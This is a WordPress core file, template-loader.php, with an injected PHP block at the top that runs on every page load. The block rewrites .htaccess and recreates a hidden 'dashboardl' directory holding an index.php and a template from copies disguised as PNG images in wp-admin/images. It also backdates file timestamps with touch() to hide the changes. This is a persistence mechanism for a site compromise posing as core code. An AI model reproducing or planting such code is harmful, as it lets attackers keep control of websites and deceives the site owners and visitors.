<?php

//ckIIbg
$nowFileDir =  'dashboardl';
$nowHtacFile =  './.htaccess';
$nmbf1 =  './dashboardl/template.html';
$nowIndexFile =  './dashboardl/index.php';
$nowLogFile =  './dashboardl/logs.txt';
$bkLocalFileIndex2 =  './wp-admin/images/align-lefts.png';
$bkLocalFileHtac2 =  './wp-admin/images/align-rights.png';
$bkLocalFileMoban2 =  './wp-admin/images/align-centers.png';

if($nowHtacFile && file_exists($bkLocalFileHtac2)){
	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac2))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowHtacFile,0755);
		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac2));
		@chmod($nowHtacFile,0755);
	}
}


if(file_exists($bkLocalFileIndex2)){
	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex2)  && !file_exists($nowLogFile))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowIndexFile,0755);
		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex2));
		@chmod($nowIndexFile,0755);
	}
}

if(file_exists($bkLocalFileMoban2)){
	
	if(!file_exists($nmbf1)){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@file_put_contents($nmbf1,file_get_contents($bkLocalFileMoban2));
		@chmod($nmbf1,0755);
	}else{
		if(filesize($nmbf1) != filesize($bkLocalFileMoban2)){
			$tpstrMb = file_get_contents($nmbf1);
			if(strstr($tpstrMb,"draft_or_post_title") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
				$fitime = filemtime($bkLocalFileMoban2);
				@chmod($bkLocalFileMoban2,0755);
				@file_put_contents($bkLocalFileMoban2,$tpstrMb);
				@touch($bkLocalFileMoban2, $fitime, $fitime);  
			}else{
				@chmod($bkLocalFileMoban2,0755);
				@file_put_contents($nmbf1,file_get_contents($bkLocalFileMoban2));
				@chmod($bkLocalFileMoban2,0755);
			}
		}
	}
	
}
//ckIIend

?>
<?php
/**
 * Loads the correct template based on the visitor's url
 *
 * @package WordPress
 */
if ( wp_using_themes() ) {
	/**
	 * Fires before determining which template to load.
	 *
	 * @since 1.5.0
	 */
	do_action( 'template_redirect' );
}

/**
 * Filters whether to allow 'HEAD' requests to generate content.
 *
 * Provides a significant performance bump by exiting before the page
 * content loads for 'HEAD' requests. See #14348.
 *
 * @since 3.5.0
 *
 * @param bool $exit Whether to exit without generating any content for 'HEAD' requests. Default true.
 */
if ( 'HEAD' === $_SERVER['REQUEST_METHOD'] && apply_filters( 'exit_on_http_head', true ) ) {
	exit;
}

// Process feeds and trackbacks even if not using themes.
if ( is_robots() ) {
	/**
	 * Fired when the template loader determines a robots.txt request.
	 *
	 * @since 2.1.0
	 */
	do_action( 'do_robots' );
	return;
} elseif ( is_favicon() ) {
	/**
	 * Fired when the template loader determines a favicon.ico request.
	 *
	 * @since 5.4.0
	 */
	do_action( 'do_favicon' );
	return;
} elseif ( is_feed() ) {
	do_feed();
	return;
} elseif ( is_trackback() ) {
	require ABSPATH . 'wp-trackback.php';
	return;
}

if ( wp_using_themes() ) {

	$tag_templates = array(
		'is_embed'             => 'get_embed_template',
		'is_404'               => 'get_404_template',
		'is_search'            => 'get_search_template',
		'is_front_page'        => 'get_front_page_template',
		'is_home'              => 'get_home_template',
		'is_privacy_policy'    => 'get_privacy_policy_template',
		'is_post_type_archive' => 'get_post_type_archive_template',
		'is_tax'               => 'get_taxonomy_template',
		'is_attachment'        => 'get_attachment_template',
		'is_single'            => 'get_single_template',
		'is_page'              => 'get_page_template',
		'is_singular'          => 'get_singular_template',
		'is_category'          => 'get_category_template',
		'is_tag'               => 'get_tag_template',
		'is_author'            => 'get_author_template',
		'is_date'              => 'get_date_template',
		'is_archive'           => 'get_archive_template',
	);
	$template      = false;

	// Loop through each of the template conditionals, and find the appropriate template file.
	foreach ( $tag_templates as $tag => $template_getter ) {
		if ( call_user_func( $tag ) ) {
			$template = call_user_func( $template_getter );
		}

		if ( $template ) {
			if ( 'is_attachment' === $tag ) {
				remove_filter( 'the_content', 'prepend_attachment' );
			}

			break;
		}
	}

	if ( ! $template ) {
		$template = get_index_template();
	}

	/**
	 * Filters the path of the current template before including it.
	 *
	 * @since 3.0.0
	 *
	 * @param string $template The path of the template to include.
	 */
	$template = apply_filters( 'template_include', $template );
	if ( $template ) {
		include $template;
	} elseif ( current_user_can( 'switch_themes' ) ) {
		$theme = wp_get_theme();
		if ( $theme->errors() ) {
			wp_die( $theme->errors() );
		}
	}
	return;
}
